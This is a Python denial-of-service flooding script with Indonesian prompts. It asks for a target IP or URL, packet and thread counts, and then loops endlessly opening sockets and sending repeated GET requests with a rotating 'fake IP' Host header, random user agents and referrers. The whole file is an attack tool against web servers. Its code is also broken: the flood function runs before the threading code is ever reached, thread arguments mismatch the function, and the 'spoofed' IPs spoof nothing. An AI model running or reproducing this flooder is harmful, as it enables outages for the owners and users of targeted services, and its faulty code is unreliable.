import socket
import threading
import random
import sys
import time



target_type = input("[*] Pilih jenis target (IP/HTTP): ").lower()

if target_type == "ip":
    ip = str(input("[@] Masukkan IP target: "))
    port = int(input("[@] Masukkan Port: "))
    target_address = (ip, port)
elif target_type == "http":
    url = str(input("[@] Masukkan URL target: "))
    target_address = (url, 80)  # 80, karena port untuk website sehingga user tinggal input link
else:
    print("Jenis koneksi target tidak valid. Harap pilih 'ip' atau 'http'.")
    sys.exit()

pack = int(input("[*] Jumlah paket: "))
thread_count = int(input("[@] Masukkan jumlah thread: "))
choice = input("[@] Pilih protokol (TCP/UDP/http/ping/slowloris): ").upper()

fake_ips = ['192.168.0.100', '192.167.0.100', '192.165.0.100'] # untuk fake ip kamu melihat banyak di internet dengan menggunakan modul random 
                                                                #random untuk membaut anggka menajdi sebuah ip palsu sehingga kami membuat versi berbeda
                                                            #sehingga menghindari mirip internet kami berpikir untuk ip fake berjalan dengan metode choose




def start_httptcp(fake_ips):
    fake_ips = ['192.168.0.100', '192.167.0.100', '192.165.0.100']

    web_device_agent = ['Mozilla/5.0 (X11; CrOS x86_64 10066.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36','Mozilla/5.0 (X11; Linux i686; rv:110.0) Gecko/20100101 Firefox/110.0.']
    web_reference = ['https://www.torproject.org/','https://www.youtube.com/',
                 'https://www.google.com/', 'https://id.search.yahoo.com/?fr2=p:fprd,mkt:id',
                    'https://web.telegram.org/k/']

    attack = 0

    while True:
        try:
            fake_ip = random.choice(fake_ips)
            user_agent = random.choice(web_device_agent)
            reference = random.choice(web_reference)


            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(target_address)

            for _ in range(pack):
                http_request = f"GET /{url} HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n"
                s.send(http_request.encode('ascii'))
                s.send(user_agent.encode('ascii'))
                s.send(reference.encode('ascii'))
                attack += 1
                
            print(f"Attacking {url} | tes: {http_request} |Sent:{attack}")
        except Exception as e:
            print('Timeout:', str(e))
            
        finally:
            s.close()   

start_httptcp(fake_ips)


def main():
    for _ in range(thread_count):
        if choice == 'slowloris':
            thread = threading.Thread(target= start_httptcp, args=(target_address, fake_ips, pack))
            thread.start()
#while True:
    # Menampilkan pesan dan menanyakan apakah pengguna ingin menghentikan serangan
#    stop = input("Type 'stop' to stop the attack: ")
#   if stop.lower() == 'stop':
#        sys.exit()
    
    # Langsung menjalankan fungsi main
main()
time.sleep(1)
